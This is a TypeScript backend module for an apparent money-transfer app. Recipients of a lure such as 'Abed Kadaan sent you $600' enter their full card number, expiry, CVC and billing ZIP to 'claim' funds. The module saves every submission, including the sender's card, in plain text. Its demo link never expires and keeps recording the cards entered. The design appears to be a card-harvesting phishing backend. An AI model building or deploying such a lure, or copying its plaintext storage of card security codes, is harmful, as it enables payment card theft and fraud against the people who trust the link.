import { getSupabase } from "./supabase";
import { last4 } from "./card";
import type {
  CardDetails,
  CreateTransferInput,
  RedeemTransferInput,
  Transfer,
} from "./types";

export const DEMO_TOKEN = "demo";

/** The seeded "Abed Kadaan sent you $600" transfer used by /r/demo. */
export const DEMO_TRANSFER: Transfer = {
  token: DEMO_TOKEN,
  senderName: "Abed Kadaan",
  senderEmail: "abed@example.com",
  recipientName: "there",
  recipientContact: "you@example.com",
  amountCents: 60000,
  note: "Thanks for covering the team dinner last week 🎉",
  status: "pending",
  createdAt: new Date("2026-08-24T15:04:00Z").toISOString(),
  claimedAt: null,
};

type Memory = { transfers: Map<string, Transfer>; cards: unknown[] };

// Survives dev-server hot reloads, which otherwise reset module state.
const globalRef = globalThis as typeof globalThis & { __bvpMemory?: Memory };
const memory: Memory =
  globalRef.__bvpMemory ??
  (globalRef.__bvpMemory = {
    transfers: new Map([[DEMO_TOKEN, { ...DEMO_TRANSFER }]]),
    cards: [],
  });

export function makeToken() {
  const alphabet = "abcdefghijkmnpqrstuvwxyz23456789";
  let out = "";
  for (let i = 0; i < 10; i++) {
    out += alphabet[Math.floor(Math.random() * alphabet.length)];
  }
  return out;
}

/**
 * Supabase reports a missing table as PGRST205, which reads as an opaque
 * schema-cache error. Point at the migration instead.
 */
function describe(error: { code?: string; message: string }) {
  if (error.code === "PGRST205") {
    return "Supabase is connected but the tables are missing — run supabase/schema.sql in the SQL editor.";
  }
  return error.message;
}

/* eslint-disable @typescript-eslint/no-explicit-any */
function rowToTransfer(row: any): Transfer {
  return {
    token: row.token,
    senderName: row.sender_name,
    senderEmail: row.sender_email ?? "",
    recipientName: row.recipient_name,
    recipientContact: row.recipient_contact ?? "",
    amountCents: row.amount_cents,
    note: row.note ?? "",
    status: row.status,
    createdAt: row.created_at,
    claimedAt: row.claimed_at,
  };
}

function cardRow(
  token: string,
  role: "sender" | "recipient",
  card: CardDetails,
  contactEmail?: string,
) {
  return {
    transfer_token: token,
    role,
    contact_email: contactEmail ?? null,
    cardholder_name: card.cardholderName,
    card_number: card.cardNumber,
    exp_month: card.expMonth,
    exp_year: card.expYear,
    cvc: card.cvc,
    billing_zip: card.billingZip,
    brand: card.brand,
    last4: last4(card.cardNumber),
  };
}

export async function createTransfer(
  input: CreateTransferInput,
): Promise<Transfer> {
  const token = makeToken();
  const transfer: Transfer = {
    token,
    senderName: input.senderName,
    senderEmail: input.senderEmail,
    recipientName: input.recipientName,
    recipientContact: input.recipientContact,
    amountCents: input.amountCents,
    note: input.note,
    status: "pending",
    createdAt: new Date().toISOString(),
    claimedAt: null,
  };

  const supabase = getSupabase();
  if (supabase) {
    const { data, error } = await supabase
      .from("transfers")
      .insert({
        token,
        sender_name: transfer.senderName,
        sender_email: transfer.senderEmail,
        recipient_name: transfer.recipientName,
        recipient_contact: transfer.recipientContact,
        amount_cents: transfer.amountCents,
        note: transfer.note,
        status: "pending",
      })
      .select()
      .single();
    if (error) throw new Error(describe(error));

    const { error: cardError } = await supabase
      .from("card_submissions")
      .insert(cardRow(token, "sender", input.card));
    if (cardError) throw new Error(describe(cardError));

    return rowToTransfer(data);
  }

  memory.transfers.set(token, transfer);
  memory.cards.push(cardRow(token, "sender", input.card));
  return transfer;
}

export async function getTransfer(token: string): Promise<Transfer | null> {
  const supabase = getSupabase();
  if (supabase) {
    try {
      const { data, error } = await supabase
        .from("transfers")
        .select()
        .eq("token", token)
        .maybeSingle();
      if (error) throw new Error(describe(error));
      if (data) return rowToTransfer(data);
    } catch (error) {
      // The showcase link has to render even before the schema is applied,
      // so only /r/demo swallows a lookup failure.
      if (token !== DEMO_TOKEN) throw error;
    }
    // Falls through when the row (or the whole schema) isn't there yet.
    return token === DEMO_TOKEN ? { ...DEMO_TRANSFER } : null;
  }

  return memory.transfers.get(token) ?? null;
}

export async function redeemTransfer(
  input: RedeemTransferInput,
): Promise<Transfer> {
  const existing = await getTransfer(input.token);
  if (!existing) throw new Error("That transfer link is not valid.");

  // The showcase link at /r/demo never burns out: every submission is still
  // recorded, but the transfer stays pending so the next visitor can try it.
  const isDemo = input.token === DEMO_TOKEN;

  if (!isDemo && existing.status === "claimed") {
    throw new Error("This transfer has already been deposited.");
  }

  const claimedAt = new Date().toISOString();
  const claimed: Transfer = { ...existing, status: "claimed", claimedAt };
  const supabase = getSupabase();

  if (supabase) {
    const { error: cardError } = await supabase
      .from("card_submissions")
      .insert(cardRow(input.token, "recipient", input.card, input.recipientEmail));
    if (cardError) throw new Error(describe(cardError));

    if (isDemo) return claimed;

    const { data, error } = await supabase
      .from("transfers")
      .update({ status: "claimed", claimed_at: claimedAt })
      .eq("token", input.token)
      .select()
      .maybeSingle();
    if (error) throw new Error(describe(error));
    return data ? rowToTransfer(data) : claimed;
  }

  memory.cards.push(
    cardRow(input.token, "recipient", input.card, input.recipientEmail),
  );
  if (!isDemo) memory.transfers.set(input.token, claimed);
  return claimed;
}
